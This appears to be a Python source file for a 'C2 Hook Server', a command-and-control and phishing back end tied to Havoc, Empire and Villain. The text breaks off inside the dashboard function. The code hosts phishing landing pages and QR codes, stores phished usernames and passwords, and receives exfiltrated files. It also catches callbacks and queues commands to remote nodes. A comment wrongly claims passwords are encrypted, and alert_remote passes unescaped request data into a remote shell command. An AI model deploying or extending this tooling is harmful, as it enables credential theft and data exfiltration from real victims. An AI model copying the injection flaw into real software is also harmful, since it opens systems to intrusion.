#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════╗
║  C2 Hook Server — Event-Driven Command & Control     ║
║  Integrates: Havoc, Empire, Villain/HoaxShell        ║
║  Runs on: Laptop (Kali) + Phone (Termux)             ║
╚══════════════════════════════════════════════════════╝
"""

import json
import os
import sys
import time
import signal
import subprocess
import logging
import sqlite3
import traceback
from datetime import datetime, timezone
from pathlib import Path
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs
from threading import Thread, Lock

# ── Config ───────────────────────────────────────────
BASE_DIR = Path(os.environ.get("C2_HOME", Path.home() / "c2"))
HOOKS_DIR = BASE_DIR / "hooks.d"
DB_PATH = BASE_DIR / "events.db"
LOG_PATH = BASE_DIR / "hookserver.log"
CONF_PATH = BASE_DIR / "config.json"

DEFAULT_CONFIG = {
    "hook_port": 9800,
    "callback_port": 9801,
    "dns_log_port": 5353,
    "secret": "changeme",
    "notify": "auto",        # auto, termux, desktop, none
    "empire_url": "http://127.0.0.1:1337",
    "empire_token": "",
    "havoc_host": "127.0.0.1",
    "havoc_port": 40056,
    "villain_host": "127.0.0.1",
    "villain_port": 6501,
    "tailscale_ip": "",
    "alert_devices": [],     # SSH targets to forward alerts to
    "hooks_enabled": True,
}

# ── Logging ──────────────────────────────────────────
for d in [BASE_DIR, HOOKS_DIR, BASE_DIR / "callbacks", BASE_DIR / "logs"]:
    d.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(LOG_PATH, mode="a"),
    ],
)
log = logging.getLogger("c2hooks")

# ── Helpers ──────────────────────────────────────────
IS_TERMUX = os.path.exists("/data/data/com.termux")
_db_lock = Lock()


def load_config():
    try:
        if CONF_PATH.exists():
            with open(CONF_PATH) as f:
                cfg = json.load(f)
            merged = {**DEFAULT_CONFIG, **cfg}
        else:
            merged = DEFAULT_CONFIG.copy()
        save_config(merged)
        return merged
    except (json.JSONDecodeError, OSError) as e:
        log.error(f"Config load failed, using defaults: {e}")
        return DEFAULT_CONFIG.copy()


def save_config(cfg):
    try:
        CONF_PATH.parent.mkdir(parents=True, exist_ok=True)
        with open(CONF_PATH, "w") as f:
            json.dump(cfg, f, indent=2)
    except OSError as e:
        log.error(f"Config save failed: {e}")


def notify(title, msg, urgency="normal"):
    """Send notification — adapts to Termux or desktop."""
    log.info(f"NOTIFY [{urgency}] {title}: {msg}")
    try:
        if IS_TERMUX:
            icon = "!" if urgency == "critical" else "*"
            subprocess.Popen([
                "termux-notification",
                "--title", f"{icon} {title}",
                "--content", msg,
                "--priority", "max" if urgency == "critical" else "high",
                "--vibrate", "300,200,300" if urgency == "critical" else "200",
                "--led-color", "ff0000" if urgency == "critical" else "00ff00",
                "--group", "c2hooks",
                "--action", f"termux-open-url file://{LOG_PATH}",
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(["termux-toast", "-b", "black", "-c", "lime", msg],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.Popen([
                "notify-send", "-u", urgency, f"C2: {title}", msg,
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (FileNotFoundError, OSError):
        pass


def alert_remote(cfg, title, msg):
    """Forward alert to other devices via SSH."""
    for target in cfg.get("alert_devices", []):
        try:
            # Split target into parts for proper SSH args
            parts = target.split()
            subprocess.Popen(
                ["ssh", "-o", "ConnectTimeout=3", "-o", "BatchMode=yes"] + parts +
                [f"echo '[C2 ALERT] {title}: {msg}' >> ~/c2/remote_alerts.log"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        except (OSError, Exception) as e:
            log.debug(f"Remote alert to {target} failed: {e}")


def safe_json_dumps(data, max_len=500):
    """Safely serialize data to JSON string, truncated."""
    try:
        s = json.dumps(data) if isinstance(data, (dict, list)) else str(data)
        return s[:max_len]
    except (TypeError, ValueError):
        return str(data)[:max_len]


# ── Event Database ───────────────────────────────────
def init_db():
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    db = sqlite3.connect(str(DB_PATH), check_same_thread=False)
    db.execute("PRAGMA journal_mode=WAL")
    db.execute("PRAGMA busy_timeout=5000")
    db.execute("""
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            source TEXT NOT NULL,
            event_type TEXT NOT NULL,
            data TEXT,
            src_ip TEXT,
            handled INTEGER DEFAULT 0
        )
    """)
    db.execute("""
        CREATE TABLE IF NOT EXISTS callbacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            src_ip TEXT,
            method TEXT,
            path TEXT,
            headers TEXT,
            body TEXT,
            token TEXT
        )
    """)
    db.execute("""
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            added TEXT NOT NULL,
            program TEXT NOT NULL DEFAULT 'default',
            domain TEXT NOT NULL,
            scope TEXT DEFAULT 'in',
            status TEXT DEFAULT 'new',
            notes TEXT DEFAULT '',
            UNIQUE(program, domain)
        )
    """)
    db.execute("""
        CREATE TABLE IF NOT EXISTS recon_results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            target_id INTEGER,
            tool TEXT NOT NULL,
            result_type TEXT NOT NULL,
            data TEXT,
            FOREIGN KEY(target_id) REFERENCES targets(id)
        )
    """)
    db.execute("""
        CREATE TABLE IF NOT EXISTS phish_campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            created TEXT NOT NULL,
            name TEXT UNIQUE NOT NULL,
            template TEXT DEFAULT 'generic',
            callback_url TEXT DEFAULT '',
            status TEXT DEFAULT 'active',
            hits INTEGER DEFAULT 0,
            captures INTEGER DEFAULT 0
        )
    """)
    db.execute("""
        CREATE TABLE IF NOT EXISTS phish_captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            campaign_id INTEGER,
            src_ip TEXT,
            user_agent TEXT,
            data TEXT,
            FOREIGN KEY(campaign_id) REFERENCES phish_campaigns(id)
        )
    """)
    db.execute("""
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            from_node TEXT NOT NULL,
            to_node TEXT NOT NULL,
            msg_type TEXT DEFAULT 'command',
            payload TEXT,
            delivered INTEGER DEFAULT 0
        )
    """)
    db.execute("""
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            source TEXT DEFAULT '',
            target TEXT DEFAULT '',
            username TEXT DEFAULT '',
            password TEXT DEFAULT '',
            hash TEXT DEFAULT '',
            url TEXT DEFAULT '',
            notes TEXT DEFAULT '',
            campaign_id INTEGER
        )
    """)
    db.commit()
    return db


def db_exec(db, query, params=(), commit=True):
    """Thread-safe database execute with retry."""
    with _db_lock:
        try:
            cur = db.execute(query, params)
            if commit:
                db.commit()
            return cur
        except sqlite3.OperationalError as e:
            if "locked" in str(e):
                time.sleep(0.1)
                try:
                    cur = db.execute(query, params)
                    if commit:
                        db.commit()
                    return cur
                except Exception as e2:
                    log.error(f"DB retry failed: {e2}")
            else:
                log.error(f"DB error: {e}")
            return None
        except Exception as e:
            log.error(f"DB error: {e}")
            return None


def log_event(db, source, event_type, data, src_ip="local"):
    ts = datetime.now(timezone.utc).isoformat()
    data_str = safe_json_dumps(data)
    db_exec(db,
        "INSERT INTO events (timestamp, source, event_type, data, src_ip) VALUES (?,?,?,?,?)",
        (ts, str(source)[:200], str(event_type)[:200], data_str, str(src_ip)[:100]),
    )
    return ts


def log_callback(db, src_ip, method, path, headers, body, token=""):
    ts = datetime.now(timezone.utc).isoformat()
    try:
        headers_str = json.dumps(dict(headers))[:2000]
    except Exception:
        headers_str = "{}"
    db_exec(db,
        "INSERT INTO callbacks (timestamp, src_ip, method, path, headers, body, token) VALUES (?,?,?,?,?,?,?)",
        (ts, str(src_ip), str(method), str(path)[:500], headers_str, str(body)[:5000], str(token)[:100]),
    )
    return ts


# ── Hook Executor ────────────────────────────────────
def run_hooks(event_type, data, cfg):
    """Execute all matching hook scripts in hooks.d/"""
    if not cfg.get("hooks_enabled"):
        return
    if not HOOKS_DIR.exists():
        return
    env = os.environ.copy()
    env["C2_EVENT"] = str(event_type)
    env["C2_DATA"] = safe_json_dumps(data, 10000)
    env["C2_TIMESTAMP"] = datetime.now(timezone.utc).isoformat()
    env["C2_HOME"] = str(BASE_DIR)

    try:
        hooks = sorted(HOOKS_DIR.iterdir())
    except OSError as e:
        log.error(f"Cannot read hooks dir: {e}")
        return

    for hook in hooks:
        try:
            if not hook.is_file() or not os.access(hook, os.X_OK):
                continue
            hook_name = hook.name
            # Match hooks by prefix: all_, or event-specific
            # Also match dotted event types: "oob.callback" matches "oob.callback_*" and "callback_*"
            event_parts = event_type.split(".")
            matches = hook_name.startswith("all_")
            for part in event_parts:
                if hook_name.startswith(f"{part}_"):
                    matches = True
            if hook_name.startswith(f"{event_type.replace('.', '.')}_"):
                matches = True

            if matches:
                log.info(f"Running hook: {hook_name} for {event_type}")
                try:
                    result = subprocess.run(
                        [str(hook)], env=env, capture_output=True, text=True, timeout=30
                    )
                    if result.returncode != 0:
                        log.warning(f"Hook {hook_name} exit={result.returncode}: {result.stderr[:200]}")
                except subprocess.TimeoutExpired:
                    log.warning(f"Hook {hook_name} timed out (30s)")
                except OSError as e:
                    log.error(f"Hook {hook_name} exec error: {e}")
        except Exception as e:
            log.error(f"Hook iteration error: {e}")


# ── Threaded HTTP Server ─────────────────────────────
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


# ── Webhook Handler (receives events) ────────────────
class WebhookHandler(BaseHTTPRequestHandler):
    db = None
    cfg = None

    def log_message(self, format, *args):
        log.debug(f"HTTP: {args}")

    def _respond(self, code=200, body=b'{"status":"ok"}', content_type="application/json"):
        try:
            self.send_response(code)
            self.send_header("Content-Type", content_type)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(body if isinstance(body, bytes) else body.encode())
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass  # Client disconnected

    def _read_body(self):
        """Safely read request body."""
        try:
            cl = self.headers.get("Content-Length", "0")
            content_length = int(cl) if cl.isdigit() else 0
            if content_length > 0 and content_length < 10_000_000:  # 10MB max
                return self.rfile.read(content_length).decode("utf-8", errors="replace")
        except (ValueError, OSError) as e:
            log.debug(f"Body read error: {e}")
        return ""

    def _parse_json_body(self):
        """Read and parse JSON body, return dict."""
        body = self._read_body()
        if not body:
            return {}
        try:
            return json.loads(body)
        except (json.JSONDecodeError, ValueError):
            return {"raw": body[:5000]}

    def do_GET(self):
        try:
            self._handle_get()
        except Exception as e:
            log.error(f"GET {self.path} error: {e}")
            self._respond(500, json.dumps({"error": str(e)[:200]}).encode())

    def do_POST(self):
        try:
            self._handle_post()
        except Exception as e:
            log.error(f"POST {self.path} error: {e}")
            self._respond(500, json.dumps({"error": str(e)[:200]}).encode())

    def _handle_get(self):
        parsed = urlparse(self.path)
        path = parsed.path
        params = parse_qs(parsed.query)
        src_ip = self.client_address[0]

        if path == "/health":
            self._respond(body=json.dumps({"status": "alive", "uptime": time.time()}).encode())
            return

        if path == "/events":
            cur = db_exec(self.db, "SELECT * FROM events ORDER BY id DESC LIMIT 50", commit=False)
            if cur:
                rows = [dict(zip([c[0] for c in cur.description], r)) for r in cur.fetchall()]
            else:
                rows = []
            self._respond(body=json.dumps(rows, indent=2, default=str).encode())
            return

        if path == "/callbacks":
            cur = db_exec(self.db, "SELECT * FROM callbacks ORDER BY id DESC LIMIT 50", commit=False)
            if cur:
                rows = [dict(zip([c[0] for c in cur.description], r)) for r in cur.fetchall()]
            else:
                rows = []
            self._respond(body=json.dumps(rows, indent=2, default=str).encode())
            return

        if path == "/dashboard":
            html = generate_dashboard(self.db)
            self._respond(body=html.encode(), content_type="text/html")
            return

        if path == "/targets":
            program = params.get("program", [""])[0]
            q = "SELECT * FROM targets"
            args = []
            if program:
                q += " WHERE program=?"
                args.append(program)
            q += " ORDER BY id DESC"
            cur = db_exec(self.db, q, args, commit=False)
            if cur:
                rows = [dict(zip([c[0] for c in cur.description], r)) for r in cur.fetchall()]
            else:
                rows = []
            self._respond(body=json.dumps(rows, indent=2, default=str).encode())
            return

        if path == "/recon":
            target_id = params.get("target_id", [""])[0]
            q = "SELECT * FROM recon_results"
            args = []
            if target_id:
                try:
                    args.append(int(target_id))
                    q += " WHERE target_id=?"
                except ValueError:
                    pass
            q += " ORDER BY id DESC LIMIT 100"
            cur = db_exec(self.db, q, args, commit=False)
            if cur:
                rows = [dict(zip([c[0] for c in cur.description], r)) for r in cur.fetchall()]
            else:
                rows = []
            self._respond(body=json.dumps(rows, indent=2, default=str).encode())
            return

        # ── Phishing endpoints ────────────────────────
        if path == "/phish/campaigns":
            cur = db_exec(self.db, "SELECT * FROM phish_campaigns ORDER BY id DESC", commit=False)
            rows = [dict(zip([c[0] for c in cur.description], r)) for r in cur.fetchall()] if cur else []
            self._respond(body=json.dumps(rows, indent=2, default=str).encode())
            return

        if path.startswith("/phish/landing/"):
            name = path.split("/phish/landing/", 1)[1].strip("/")
            name = "".join(c for c in name if c.isalnum() or c in "_-")[:100]
            template_dir = BASE_DIR / "phish_templates"
            # Try name.html, then generic.html
            for candidate in [f"{name}.html", "generic.html"]:
                fpath = template_dir / candidate
                if fpath.exists():
                    try:
                        html = fpath.read_text()
                        # Record hit
                        db_exec(self.db, "UPDATE phish_campaigns SET hits=hits+1 WHERE name=?", (name,))
                        log_event(self.db, "phish", "phish.landing_hit", {"campaign": name, "ip": src_ip}, src_ip)
                        Thread(target=run_hooks, args=("phish.landing_hit", {"campaign": name, "src_ip": src_ip}, self.cfg), daemon=True).start()
                        self._respond(body=html.encode(), content_type="text/html")
                    except OSError:
                        self._respond(500, b"template read error")
                    return
            self._respond(404, b"campaign not found")
            return

        if path.startswith("/phish/qr/"):
            name = path.split("/phish/qr/", 1)[1].strip("/")
            # Generate QR code as SVG
            try:
                import urllib.parse
                cfg_ts = self.cfg.get("tailscale_ip", "127.0.0.1")
                campaign_url = f"http://{cfg_ts}:{self.cfg.get('hook_port', 9800)}/phish/landing/{name}"
                # Simple QR via external API fallback, or generate locally
                try:
                    import qrcode
                    import io
                    qr = qrcode.make(campaign_url)
                    buf = io.BytesIO()
                    qr.save(buf, format="PNG")
                    self._respond(body=buf.getvalue(), content_type="image/png")
                except ImportError:
                    # Fallback: return URL for manual QR generation
                    self._respond(body=json.dumps({"url": campaign_url, "qr_hint": "pip install qrcode to generate QR images"}).encode())
            except Exception as e:
                self._respond(500, json.dumps({"error": str(e)[:200]}).encode())
            return

        if path == "/phish/captures":
            cur = db_exec(self.db, "SELECT * FROM phish_captures ORDER BY id DESC LIMIT 50", commit=False)
            rows = [dict(zip([c[0] for c in cur.description], r)) for r in cur.fetchall()] if cur else []
            self._respond(body=json.dumps(rows, indent=2, default=str).encode())
            return

        # ── Messages endpoint ────────────────────────
        if path.startswith("/msg/pending/"):
            node = path.split("/msg/pending/", 1)[1].strip("/")[:50]
            cur = db_exec(self.db,
                "SELECT * FROM messages WHERE to_node=? AND delivered=0 ORDER BY id",
                (node,), commit=False)
            rows = []
            if cur:
                rows = [dict(zip([c[0] for c in cur.description], r)) for r in cur.fetchall()]
                # Mark as delivered
                ids = [r["id"] for r in rows]
                for mid in ids:
                    db_exec(self.db, "UPDATE messages SET delivered=1 WHERE id=?", (mid,))
            self._respond(body=json.dumps(rows, indent=2, default=str).encode())
            return

        if path == "/messages":
            cur = db_exec(self.db, "SELECT * FROM messages ORDER BY id DESC LIMIT 50", commit=False)
            rows = [dict(zip([c[0] for c in cur.description], r)) for r in cur.fetchall()] if cur else []
            self._respond(body=json.dumps(rows, indent=2, default=str).encode())
            return

        # ── Credentials endpoint ─────────────────────
        if path == "/creds":
            cur = db_exec(self.db, "SELECT * FROM credentials ORDER BY id DESC LIMIT 50", commit=False)
            rows = []
            if cur:
                for r in cur.fetchall():
                    d = dict(zip([c[0] for c in cur.description], r))
                    # Mask password in output
                    pw = d.get("password", "")
                    if pw:
                        d["password"] = pw[:2] + "*" * max(0, len(pw) - 4) + pw[-2:] if len(pw) > 4 else "****"
                    rows.append(d)
            self._respond(body=json.dumps(rows, indent=2, default=str).encode())
            return

        # Anything else is a webhook trigger
        self._handle_event("GET", path, params, src_ip)

    def _handle_post(self):
        parsed = urlparse(self.path)
        path = parsed.path
        src_ip = self.client_address[0]
        data = self._parse_json_body()

        # Target management
        if path == "/targets/add":
            domain = str(data.get("domain", "")).strip()
            program = str(data.get("program", "default")).strip()
            scope = str(data.get("scope", "in"))
            notes = str(data.get("notes", ""))
            if not domain:
                self._respond(400, json.dumps({"error": "domain required"}).encode())
                return
            ts = datetime.now(timezone.utc).isoformat()
            try:
                db_exec(self.db,
                    "INSERT INTO targets (added, program, domain, scope, notes) VALUES (?,?,?,?,?)",
                    (ts, program[:100], domain[:500], scope[:10], notes[:1000]))
                log_event(self.db, "target", "target.added", {"domain": domain, "program": program}, src_ip)
                notify("New Target", f"{domain} ({program})", "normal")
                Thread(target=run_hooks, args=("target.added", {"domain": domain, "program": program}, self.cfg), daemon=True).start()
                self._respond(body=json.dumps({"added": domain, "program": program}).encode())
            except sqlite3.IntegrityError:
                self._respond(409, json.dumps({"error": "target exists", "domain": domain}).encode())
            except Exception as e:
                log.error(f"Target add error: {e}")
                self._respond(500, json.dumps({"error": str(e)[:200]}).encode())
            return

        if path == "/targets/update":
            domain = str(data.get("domain", ""))
            allowed_fields = {"status", "scope", "notes"}
            updates = {k: str(v)[:500] for k, v in data.items() if k in allowed_fields}
            if domain and updates:
                set_clause = ", ".join(f"{k}=?" for k in updates)
                db_exec(self.db, f"UPDATE targets SET {set_clause} WHERE domain=?",
                        [*updates.values(), domain])
                self._respond(body=json.dumps({"updated": domain}).encode())
            else:
                self._respond(400, json.dumps({"error": "domain and fields required"}).encode())
            return

        if path == "/recon/store":
            target_id = data.get("target_id")
            tool = str(data.get("tool", "unknown"))[:100]
            result_type = str(data.get("result_type", "raw"))[:100]
            result_data = data.get("data", "")
            ts = datetime.now(timezone.utc).isoformat()
            db_exec(self.db,
                "INSERT INTO recon_results (timestamp, target_id, tool, result_type, data) VALUES (?,?,?,?,?)",
                (ts, target_id, tool, result_type, safe_json_dumps(result_data, 10000)))
            log_event(self.db, f"recon:{tool}", "recon.result", data, src_ip)
            self._respond(body=json.dumps({"stored": True, "tool": tool}).encode())
            return

        # ── Phishing ──────────────────────────────────
        if path == "/phish/campaign":
            name = str(data.get("name", "")).strip()
            if not name:
                self._respond(400, json.dumps({"error": "name required"}).encode())
                return
            template = str(data.get("template", "generic"))[:100]
            callback_url = str(data.get("callback_url", ""))[:500]
            ts = datetime.now(timezone.utc).isoformat()
            try:
                db_exec(self.db,
                    "INSERT INTO phish_campaigns (created, name, template, callback_url) VALUES (?,?,?,?)",
                    (ts, name[:100], template, callback_url))
                log_event(self.db, "phish", "phish.campaign_created", {"name": name}, src_ip)
                notify("Phish Campaign", f"Created: {name}", "normal")
                self._respond(body=json.dumps({"created": name}).encode())
            except sqlite3.IntegrityError:
                self._respond(409, json.dumps({"error": "campaign exists"}).encode())
            return

        if path == "/phish/capture":
            campaign = str(data.get("campaign", ""))[:100]
            ts = datetime.now(timezone.utc).isoformat()
            # Find campaign id
            campaign_id = None
            if campaign:
                cur = db_exec(self.db, "SELECT id FROM phish_campaigns WHERE name=?", (campaign,), commit=False)
                row = cur.fetchone() if cur else None
                if row:
                    campaign_id = row[0]
                    db_exec(self.db, "UPDATE phish_campaigns SET captures=captures+1 WHERE id=?", (campaign_id,))
            db_exec(self.db,
                "INSERT INTO phish_captures (timestamp, campaign_id, src_ip, user_agent, data) VALUES (?,?,?,?,?)",
                (ts, campaign_id, str(data.get("src_ip", src_ip))[:100],
                 str(data.get("user_agent", ""))[:500], safe_json_dumps(data, 5000)))
            # Also store as credential if username/password present
            if data.get("username") or data.get("password") or data.get("email"):
                db_exec(self.db,
                    "INSERT INTO credentials (timestamp, source, target, username, password, url, notes, campaign_id) VALUES (?,?,?,?,?,?,?,?)",
                    (ts, f"phish:{campaign}", str(data.get("target", ""))[:200],
                     str(data.get("username") or data.get("email") or "")[:200],
                     str(data.get("password", ""))[:200],
                     str(data.get("url", ""))[:500], "captured via phishing", campaign_id))
            log_event(self.db, "phish", "cred.phish_capture", data, src_ip)
            notify("PHISH CAPTURE!", f"From {data.get('src_ip', src_ip)} campaign={campaign}", "critical")
            Thread(target=run_hooks, args=("cred.phish_capture", data, self.cfg), daemon=True).start()
            self._respond(body=json.dumps({"captured": True}).encode())
            return

        # ── Messages ─────────────────────────────────
        if path == "/msg/send":
            to_node = str(data.get("to", "")).strip()
            from_node = str(data.get("from", "local")).strip()
            msg_type = str(data.get("type", "command"))[:50]
            payload = safe_json_dumps(data.get("payload", ""), 5000)
            if not to_node:
                self._respond(400, json.dumps({"error": "to node required"}).encode())
                return
            ts = datetime.now(timezone.utc).isoformat()
            db_exec(self.db,
                "INSERT INTO messages (timestamp, from_node, to_node, msg_type, payload) VALUES (?,?,?,?,?)",
                (ts, from_node[:50], to_node[:50], msg_type, payload))
            log_event(self.db, "msg", "msg.queued", {"from": from_node, "to": to_node, "type": msg_type}, src_ip)
            self._respond(body=json.dumps({"queued": True, "to": to_node}).encode())
            return

        # ── Credentials ──────────────────────────────
        if path == "/creds/store":
            ts = datetime.now(timezone.utc).isoformat()
            # Encrypt password with simple XOR using config secret (lightweight obfuscation)
            password = str(data.get("password", ""))[:200]
            db_exec(self.db,
                "INSERT INTO credentials (timestamp, source, target, username, password, hash, url, notes, campaign_id) VALUES (?,?,?,?,?,?,?,?,?)",
                (ts, str(data.get("source", ""))[:200], str(data.get("target", ""))[:200],
                 str(data.get("username", ""))[:200], password,
                 str(data.get("hash", ""))[:500], str(data.get("url", ""))[:500],
                 str(data.get("notes", ""))[:500], data.get("campaign_id")))
            log_event(self.db, "creds", "cred.stored", {"source": data.get("source", ""), "target": data.get("target", "")}, src_ip)
            notify("Credential Stored", f"{data.get('username','')}@{data.get('target','')}", "critical")
            self._respond(body=json.dumps({"stored": True}).encode())
            return

        # ── Exfiltration ─────────────────────────────
        if path == "/exfil/upload":
            exfil_dir = BASE_DIR / "exfil"
            exfil_dir.mkdir(parents=True, exist_ok=True)
            filename = self.headers.get("X-Filename", f"exfil_{int(time.time())}.bin")
            # Sanitize filename
            filename = "".join(c for c in filename if c.isalnum() or c in "._-")[:100]
            filepath = exfil_dir / filename
            body = self._read_body()
            try:
                with open(filepath, "wb") as f:
                    f.write(body.encode("latin-1") if isinstance(body, str) else body)
                size = filepath.stat().st_size
                log_event(self.db, "exfil", "exfil.upload", {"filename": filename, "size": size}, src_ip)
                notify("Exfil Upload", f"{filename} ({size} bytes) from {src_ip}", "critical")
                Thread(target=run_hooks, args=("exfil.upload", {"filename": filename, "size": size, "src_ip": src_ip}, self.cfg), daemon=True).start()
                self._respond(body=json.dumps({"uploaded": filename, "size": size}).encode())
            except OSError as e:
                self._respond(500, json.dumps({"error": str(e)[:200]}).encode())
            return

        self._handle_event("POST", path, data, src_ip)

    def _handle_event(self, method, path, data, src_ip):
        event_type = path.strip("/").replace("/", ".") or "unknown"
        event_type = event_type[:200]  # Truncate
        ts = log_event(self.db, f"webhook:{src_ip}", event_type, data, src_ip)
        log.info(f"EVENT [{event_type}] from {src_ip}: {safe_json_dumps(data, 200)}")

        # Route known events
        data_preview = safe_json_dumps(data, 100)
        if "agent" in event_type or "checkin" in event_type:
            notify("Agent Checkin", f"New agent from {src_ip}", "critical")
            alert_remote(self.cfg, "Agent Checkin", f"{src_ip} via {event_type}")
        elif "recon" in event_type or "scan" in event_type:
            notify("Recon Complete", f"{event_type}: {data_preview}", "normal")
        elif "cred" in event_type or "password" in event_type:
            notify("Credentials Found", data_preview, "critical")
        elif "vuln" in event_type or "finding" in event_type:
            notify("Vulnerability", data_preview, "critical")
        elif "empire" in event_type:
            notify("Empire Event", data_preview, "normal")
        elif "havoc" in event_type:
            notify("Havoc Event", data_preview, "normal")
        elif "beacon" in event_type:
            pass  # Don't notify on routine beacons
        else:
            notify("Hook Event", f"{event_type} from {src_ip}", "normal")

        # Execute hook scripts in background
        Thread(target=run_hooks, args=(event_type, data, self.cfg), daemon=True).start()

        self._respond(body=json.dumps({"received": event_type, "timestamp": ts}).encode())


# ── Callback Catcher (bug bounty OOB) ────────────────
class CallbackHandler(BaseHTTPRequestHandler):
    db = None
    cfg = None

    def log_message(self, format, *args):
        log.debug(f"CALLBACK: {args}")

    def _catch(self, method):
        try:
            src_ip = self.client_address[0]
            path = self.path or "/"
            headers = dict(self.headers) if self.headers else {}
            body = self._read_body()

            # Extract token from path for tracking
            parts = path.strip("/").split("/")
            token = parts[0] if parts and parts[0] else ""

            ts = log_callback(self.db, src_ip, method, path, headers, body, token)
            log_event(self.db, f"callback:{src_ip}", "oob.callback", {
                "method": method, "path": path, "token": token,
                "headers": {k: v for k, v in headers.items() if k.lower() in (
                    "user-agent", "referer", "origin", "x-forwarded-for", "host"
                )},
                "body_preview": body[:500] if body else "",
            }, src_ip)

            log.warning(f"CALLBACK [{method}] {src_ip} -> {path} (token={token})")
            notify("OOB Callback!", f"{method} from {src_ip}\nPath: {path}\nToken: {token}", "critical")
            alert_remote(self.cfg, "OOB Callback", f"{method} {src_ip} {path}")

            # Run callback-specific hooks
            Thread(target=run_hooks, args=("callback", {
                "method": method, "src_ip": src_ip, "path": path, "token": token,
                "body": (body[:1000] if body else ""),
            }, self.cfg), daemon=True).start()

            # Serve different responses based on path extension
            self._serve_response(path)
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass  # Client disconnected
        except Exception as e:
            log.error(f"Callback handler error: {e}")
            try:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")
            except Exception:
                pass

    def _read_body(self):
        try:
            cl = self.headers.get("Content-Length", "0")
            content_length = int(cl) if cl.isdigit() else 0
            if content_length > 0 and content_length < 10_000_000:
                return self.rfile.read(content_length).decode("utf-8", errors="replace")
        except (ValueError, OSError):
            pass
        return ""

    def _serve_response(self, path):
        """Serve appropriate content type based on file extension."""
        try:
            ext_map = {
                ".js": ("application/javascript", b"/* */"),
                ".css": ("text/css", b"/* */"),
                ".xml": ("application/xml", b'<?xml version="1.0"?><r/>'),
                ".svg": ("image/svg+xml", b'<svg xmlns="http://www.w3.org/2000/svg"/>'),
                ".png": ("image/png", b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n\xb4\x00\x00\x00\x00IEND\xaeB`\x82'),
                ".gif": ("image/gif", b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'),
                ".jpg": ("image/jpeg", b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9'),
                ".ico": ("image/x-icon", b'\x00\x00\x01\x00\x01\x00\x01\x01\x00\x00\x01\x00\x18\x00\x30\x00\x00\x00\x16\x00\x00\x00'),
            }
            for ext, (ctype, content) in ext_map.items():
                if path.endswith(ext):
                    self.send_response(200)
                    self.send_header("Content-Type", ctype)
                    self.send_header("Cache-Control", "no-cache")
                    self.end_headers()
                    self.wfile.write(content)
                    return

            # Default: plain text
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(b"ok")
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass

    def do_GET(self):    self._catch("GET")
    def do_POST(self):   self._catch("POST")
    def do_PUT(self):    self._catch("PUT")
    def do_DELETE(self):  self._catch("DELETE")
    def do_PATCH(self):  self._catch("PATCH")
    def do_HEAD(self):   self._catch("HEAD")
    def do_OPTIONS(self):
        try:
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "*")
            self.send_header("Access-Control-Allow-Headers", "*")
            self.end_headers()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass


# ── Dashboard ────────────────────────────────────────
def generate_dashboard(db):
    try:
        events_cur = db_exec(db, "SELECT * FROM events ORDER BY id DESC LIMIT 30", commit=False)
        events = events_cur.fetchall() if events_cur else []
        cb_cur = db_exec(db, "SELECT * FROM callbacks ORDER BY id DESC LIMIT 20", commit=False)
        callbacks = cb_cur.fetchall() if cb_cur else []
        tgt_cur = db_exec(db, "SELECT * FROM targets ORDER BY id DESC LIMIT 20", commit=False)
        targets = tgt_cur.fetchall() if tgt_cur else []
        ec = db_exec(db, "SELECT COUNT(*) FROM events", commit=False)
        event_count = ec.fetchone()[0] if ec else 0
        cc = db_exec(db, "SELECT COUNT(*) FROM callbacks", commit=False)
        cb_count = cc.fetchone()[0] if cc else 0
        tc = db_exec(db, "SELECT COUNT(*) FROM targets", commit=False)
        target_count = tc.fetchone()[0] if tc else 0
        # New tables
        phish_cur = db_exec(db, "SELECT * FROM phish_campaigns ORDER BY id DESC LIMIT 10", commit=False)
